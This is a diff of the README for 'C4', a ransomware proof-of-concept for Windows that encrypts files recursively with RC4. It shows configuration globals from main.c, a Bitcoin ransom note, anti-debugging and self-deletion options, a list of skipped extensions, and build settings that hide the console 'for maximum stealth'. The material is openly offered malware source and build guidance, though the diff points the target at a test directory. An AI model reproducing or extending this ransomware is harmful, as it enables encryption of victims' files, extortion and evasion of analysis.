@@ -21,9 +21,9 @@ C4 is a ransomware proof-of-concept that weaponizes the Rivest Cipher 4 (RC4) to
 
 - Uses RC4 encryption in a recursive, multithreaded fashion to rapidly encrypt or decrypt files.  
 - Targets files in a configurable list of directories, while skipping those with blacklisted extensions.  
-- Can drop a ransom note with custom text once encryption completes.  
+- Drops a ransom note with custom text once encryption completes.  
 - Includes anti-debugging logic to terminate execution if a debugger is detected.  
-- Optionally self-deletes the executable after finishing.  
+- Self-deletes the executable after finishing.
 - Supports a verbose mode to log every encrypted file and report total runtime.
 
 ---
@@ -43,45 +43,35 @@ No command-line arguments required. C4 will recurse each directory listed in the
 Before building, you can tune C4's behavior by editing the globals at the top of `main.c`. Here's what to look for:
 
 ```c
-#pragma section(".text", read, execute)
-// TRUE = Encrypt; FALSE = Decrypt
-__declspec(allocate(".text")) BOOL   g_EncryptMode       = TRUE;
+   ///////////////////
+  // CONFIGURATION //
+ ///////////////////
 
-// TRUE = Drop a ransom note (g_Note)
-__declspec(allocate(".text")) BOOL   g_RansomMode        = TRUE;
+TEXT_SECTION BOOL g_EncryptMode         =       TRUE;     // TRUE = Encrypt, FALSE = Decrypt
+TEXT_SECTION BOOL g_RansomMode          =       TRUE;     // TRUE = Drop a text file (g_Note) with payment instructions to the current directory
+TEXT_SECTION BOOL g_AntiDebug           =       TRUE;     // TRUE = Program exits when debugger (such as x64dbg, OllyDbg, WinDbg) is attached 
+TEXT_SECTION BOOL g_SelfDelete          =       TRUE;     // TRUE = Binary will self-delete
+TEXT_SECTION BOOL g_Verbose             =       TRUE;     // TRUE = Print files, directories, errors, and execution time to the console
 
-// TRUE = Hide the console window
-__declspec(allocate(".text")) BOOL   g_HideConsole       = TRUE;
 
-// TRUE = Exit immediately if a debugger is detected
-__declspec(allocate(".text")) BOOL   g_AntiDebug         = TRUE;
+LPCWSTR g_Directories[] = { 
+    L"C:\\Users\\Public\\TestDirectory", 
+    NULL                               
+}; 
 
-// TRUE = Self-delete the EXE after finishing
-__declspec(allocate(".text")) BOOL   g_SelfDelete        = TRUE;
-
-// TRUE = Print each file encrypted, errors, and total runtime
-__declspec(allocate(".text")) BOOL   g_Verbose           = FALSE;
-
-// List of directories to process - final entry **must** be NULL
-__declspec(allocate(".text")) LPCWSTR g_Directories[]    = {
-    L"C:\\Users",
-    NULL
+LPCWSTR g_BlacklistedExtensions[NUM_BLACKLISTED_EXTENSIONS] = {    
+    ENCRYPT_EXT_W,
+    L".exe", L".dll", L".sys", L".ini", L".conf",
+    L".cfg", L".reg", L".dat", L".bat", L".cmd"
 };
 
-// Ransom note text that will be written when g_RansomMode == TRUE
-__declspec(allocate(".text")) const char* g_Note =
+
+LPCSTR g_Note = {           
     "YOUR FILES HAVE BEEN ENCRYPTED BY C4.EXE\r\n"
     "This is not a joke. Want your data restored?\r\n"
     "Send 0.5 BTC to the address below:\r\n"
-    "1MockBTCAddrxxxxxxxxxxxxxxxx\r\n"
-    "You have 48 hours.\r\n";
-
-// File extensions to skip (include the dot)
-LPCWSTR g_BlacklistedExtensions[NUM_BLACKLISTED_EXTENSIONS] = {
-    ENCRYPT_EXT_W,
-    L".exe", L".dll", L".sys", L".ini", 
-    L".conf", L".cfg", L".reg", L".dat", 
-    L".bat", L".cmd"
+    "1MockBTCAddrxxxxxxxxxxxxxxxxxx\r\n"
+    "You have 48 hours.\r\n"
 };
 ```
 
@@ -100,10 +90,10 @@ LPCWSTR g_BlacklistedExtensions[NUM_BLACKLISTED_EXTENSIONS] = {
    - **C/C++ → General → SDL checks:** No (/sdl-)  
    - **C/C++ → Optimization → Whole Program Optimization:** No  
    - **Linker → Debugging → Generate Debug Info:** No  
-   - **Linker → Manifest → Generate Manifest:** No  
+   - **Linker → Manifest File → Generate Manifest:** No  
    - **Linker → Input → Ignore All Default Libraries:** Yes (/NODEFAULTLIB)  
    - **Linker → Advanced → Entry Point:** `main`  
-   - **Linker → System → Subsystem:** Windows – hides the console for maximum stealth (switch to Console subsystem if you need to see output in verbose mode)
+   - **Linker → System → Subsystem:** Windows – hides the console for maximum stealth (switch to Console subsystem when using verbose mode)
 4. Build the solution.
 
 ---
